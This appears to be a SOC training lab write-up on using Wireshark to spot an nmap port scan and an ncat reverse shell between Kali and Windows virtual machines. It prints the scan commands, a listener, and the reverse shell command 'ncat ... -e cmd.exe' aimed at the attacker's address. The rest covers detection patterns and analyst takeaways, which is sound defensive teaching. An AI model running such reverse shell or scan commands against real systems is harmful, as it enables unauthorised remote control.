# Wireshark SOC Lab – Port Scan and Reverse Shell (Kali – Windows – Ubuntu)

## Lab goal

The goal of this exercise is to understand, from the perspective of a junior SOC analyst:
1) what an nmap port scan looks like,
2) what a ncat reverse shell looks like,
3) how antivirus reacts to this activity,
and how to analyze all of this with Wireshark on an analysis machine.

The lab simulates a mini‑SOC: Kali as the attacker, Windows as the victim, and Ubuntu with Wireshark as a sensor/sniffer in the network.

## Lab topology

- **Kali Linux** – attacking host:
  - tools: `nmap`, `nc` (netcat)
  - role: scanning Windows ports and receiving the reverse shell.

- **Windows 10** – victim host:
  - tools: `ncat` (from the Nmap package), Windows Defender
  - role: target of scans, reverse shell client connecting to Kali.

- **Ubuntu Linux** – analysis host:
  - tools: Wireshark
  - role: network sensor, capturing and analyzing Kali ↔ Windows traffic.

All three machines are in the same virtual network, and the Ubuntu interface is set to promiscuous mode so it can see traffic between the other VMs.

## Issue 1: No traffic in Wireshark / missing interface

At the beginning, Wireshark on Ubuntu did not show the expected interface or any traffic between the VMs.

### Fixes

1. **Checking interfaces on Ubuntu**
   - `ip a` – identify the real interface name (e.g. `enp0s3`, `ens33`).
   - Match that name to the interface list in Wireshark.

2. **Capture permissions**
   - Allow packet capture for non‑root users:
     - `sudo dpkg-reconfigure wireshark-common` → choose “Yes” for non‑root capture.
   - Add user `ubuntu` to the `wireshark` group:
     - `sudo usermod -aG wireshark ubuntu`
   - Relog / reboot and verify:
     - `groups ubuntu` → `wireshark` group present.

3. **Network configuration and promiscuous mode**
   - Verify VM network mode (NAT / Host‑only / Internal) and ensure all VMs share the same network.
   - Enable **Promiscuous mode: Allow All / Allow VMs** on the virtual NIC in the hypervisor.
   - This allows the Ubuntu interface to see packets destined for other VMs (Kali, Windows).

Result: Ubuntu with Wireshark started seeing full traffic between Kali and Windows, which enabled the analysis part of the lab.

## Project 1: Detecting a port scan (nmap)

### Steps

1. **Prepare IPs and connectivity**
   - On Windows: `ipconfig` → get the victim’s IP.
   - On Kali: `ping 192.168.56.12` → confirm connectivity.
   - On Ubuntu: `ping` to Kali and Windows to ensure the sensor is in the same network.

2. **Capture in Wireshark**
   - Start capturing on the correct Ubuntu interface.
   - Helper display filter:
     - `ip.addr == 192.168.56.11 || ip.addr == 192.168.56.12`.

3. **Scanning from Kali**
   - Simple scan:
     - `nmap 192.168.56.12`
   - More intensive scan:
     - `nmap -p 1-1000 192.168.56.12`

4. **Analysis in Wireshark**
   - Filter for TCP traffic from Kali to Windows:
     - `ip.src == 192.168.56.11 && ip.dst == 192.168.56.12 && tcp`
   - Observed characteristics:
     - One source IP (Kali), many destination ports.
     - Short sequences: `SYN` → `SYN/ACK` or `SYN` → `RST, ACK`.
     - High density of connection attempts in a short time.

5. **Conclusion**
   - nmap scan pattern in Wireshark:
     - A single source IP tries to establish many TCP connections (SYN) to multiple ports on the same target host within a short period.
     - Responses `SYN/ACK` (open port) and `RST/ACK` (closed port).

## Project 2: Reverse shell (ncat) + TCP stream analysis

### Preparing the reverse shell

1. **Kali – listener**

```bash
nc -nlvp 4444
```
Kali listens on port 4444 and waits for a connection from Windows.

2. **Windows – install ncat (if nc.exe is missing)**
   - Install Nmap for Windows with the Ncat component.
   - After installation: ncat --version in CMD to confirm the tool is available.

3. **Windows – reverse shell to Kali**
```bash
ncat -nv 192.168.56.11 4444 -e cmd.exe
```
Windows connects to Kali, and the cmd.exe process is attached to that network channel.

4. **Ubuntu – capture in Wireshark**
  - Start capturing.
  - Filter for reverse shell traffic:
    - ```tcp.port == 4444```.

**Reverse shell analysis in Wireshark**
  1. After sending a few commands from Kali (whoami, dir), the connection was suddenly dropped because Windows Defender detected a threat and killed the reverse shell process.

  2. **Follow TCP Stream**
    - Select a data packet (e.g. PSH, ACK) on port 4444.
    - Follow → TCP Stream.
    - Visible elements:
      - One direction: commands sent from Kali (whoami, dir).
      - Other direction: responses from Windows (username, directory listing).

  3. **SOC interpretation**
     - A TCP stream on an unusual port that contains system commands and their output is a strong indicator of a remote console.
     - Windows Defender simultaneously raised an alert and terminated the process – typical AV/EDR behavior in response to a reverse shell.

  ## Key SOC takeaways
  1. **Promiscuous mode on the Ubuntu interface**
     - Enables observation of traffic between other hosts in the same network segment (Kali ↔ Windows).
     - This is fundamental for network sensors and IDS/IPS.

  2. **nmap scan pattern in Wireshark**
     - Single source IP, many destination ports.
     - Lots of `SYN` packets in a short period.
     - `SYN/ACK` responses (open ports) and `RST/ACK` responses (closed ports).

  3. **Reverse shell pattern in Wireshark**
     - Long‑lived TCP connection on a non‑standard port.
     - Stream contains system commands and their output (when not encrypted).
     - Correlating this with an AV/EDR alert (e.g. Windows Defender) strongly supports the incident hypothesis.

  4. **Thinking like a SOC analyst**
     - Network visibility (Wireshark) + endpoint logs/alerts (Defender) = a much clearer picture of what happened.
     - Unusual port + console‑like commands + AV alert is a strong signal of a reverse shell / remote control activity.

**Possible lab extensions**
- Try a reverse shell on a different port and compare the artifacts.
- Add a SIEM (e.g. Splunk) and forward Windows logs plus Wireshark‑derived metadata there.
- Write a response checklist for a detected reverse shell: artifacts to collect (IP, port, user, process path, file hash, timestamp, hostname).
